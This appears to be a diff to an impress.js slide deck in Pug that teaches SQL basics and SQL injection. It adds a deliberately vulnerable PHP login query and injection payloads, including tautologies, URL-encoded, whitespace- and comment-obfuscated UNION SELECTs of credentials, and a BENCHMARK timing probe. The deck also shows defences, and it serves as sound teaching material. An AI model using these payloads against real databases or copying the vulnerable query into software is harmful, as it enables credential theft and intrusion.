@@ -4,13 +4,90 @@ html(lang='en')
     link(rel='stylesheet' type='text/css' href='./css/main.css')
   body
     #impress
-      #good-side
+      .good-side
         #sql.step(data-z=-1)
           #sql-header SQL
         h1#what-is.step(data-x=300 data-y=0 data-rotate=90 data-scale=0.25) Structured Query Language
+        #structure.step(data-scale=.1, data-x=-300, data-y=75, data-rotate=35)
+        - var scale = 0.07
+        - var yoff = 50
+        - var xoff = 40
+        #insert-into.step(data-scale=scale, data-y=-yoff data-x=-xoff)
+          h2 INSERT INTO
+          code INSERT INTO table_name (column1,column2,column3,...) VALUES (value1,value2,value3,...);
+          code INSERT INTO table_name VALUES (value1,value2,value3,...);
+          code INSERT INTO `chat` ('hi people', 'crankyman', 20140318032021)
+        #select.step(data-scale=scale data-y=yoff data-x=-xoff)
+          h2 SELECT
+          code SELECT column1,column2 FROM table_name;
+          code SELECT * FROM `chat`;
+          code SELECT * FROM `chat` WHERE `user` = 'cdeboor'
+        #where.step(data-scale=scale, data-rotate-y=90, data-z=300)
+          h2 WHERE
+          p Specifies which rows to select
+          code WHERE 1
+          code WHERE `msg` LIKE 'c%'
+          code WHERE `msg` IN ('hi','hello')
+        #union.step(data-scale=scale data-y=yoff data-x=xoff)
+          h2 UNION
+          code SELECT * FROM `chat` WHERE `user`='papa' UNION SELECT * FROM `chat` WHERE `user`='cdeboor';
+        #update.step(data-scale=scale data-y=-yoff data-x=xoff)
+          h2 UPDATE
+          code UPDATE table_name SET column1=value1,column2=value2;
+          code UPDATE `chat` SET `msg`='we\'re done here' WHERE `id`=168;
 
-      #evil-side
+      - scale = .25
+      - var x0 = 300
+      - var xs = 300
+      - var y0 = -200
+      - var ys = 200
+      .evil-side
         #inject.step(data-z=-2 data-rotate-y=180): h1 SQL Injection
+        #culprit.step(data-z=-3 data-rotate-y=180 data-scale=.4)
+          h1 The Culprit
+          code $password = mysql_query("SELECT password FROM users WHERE password = '". $_GET['pass'] . "';");
+        #basic-injection.step(data-z=-3 data-rotate-y=180 data-scale=scale data-x=x0 data-y=y0)
+          h2 Basic Injection
+          code ' OR 1 /*
+          code SELECT password FROM users WHERE password = '' OR 1 /*';
+
+      .good-side
+        #coping-strategy-1.step(data-z=-2000 data-scale=scale data-x=x0-2*xs data-y=y0)
+          h2 Apache mod_security
+
+      .evil-side
+        #alternate-encoding.step(data-z=-3 data-rotate-y=180 data-scale=scale data-x=x0-2*xs data-y=y0)
+          h2 URL Encoding
+          code NULL OR 1 = 1/*
+          code NULL+OR+1%3D%20%201%2F%2A
+        #white-space.step(data-z=-3 data-rotate-y=180 data-scale=scale data-x=x0-2*xs data-y=y0+ys/4)
+          h2 White Space Confusion
+          code NULL OR 'value'='value'/*
+          code NULL%0aOR%0a'value'='value'/*
+        #commenting.step(data-z=-3 data-rotate-y=180 data-scale=scale data-x=x0-2*xs data-y=y0+ys/4*2)
+          h2 SQL C-Style Comments
+          code NULL UNION ALL SELECT user,pass, FROM user_db WHERE user LIKE '%admin%/*
+          code NULL/**/UNION/**/ALL/**/SELECT/**/user,pass,/**/FROM/**/user_db/**/WHERE/**/uid/**/=/*evade*/'1'//
+
+      .good-side
+        #coping-strategy-2.step(data-z=-2000 data-scale=scale data-x=x0 data-y=y0+2*ys)
+          h2 addslashes()
+          code addslashes($_POST['pass'])
+
+      .evil-side
+        #gbk-characters.step(data-z=-3 data-rotate-y=180 data-scale=scale data-x=x0 data-y=y0+2*ys)
+          h1 GBK Attack
+
+      .good-side
+        #blind-attack.step(data-z=-2000 data-scale=scale data-x=x0-2*xs data-y=y0+2*ys)
+          h2 Blind SQL Attacks
+          p Good error handling
+
+      .evil-side
+        #benchmark.step(data-z=-3 data-rotate-y=180 data-scale=scale data-x=x0-2*xs data-y=y0+2*ys)
+          h2 Benchmarking
+          code NULL UNION SELECT BENCHMARK()
+
 
 
     script(type='text/javascript' src='./js/impress.js')
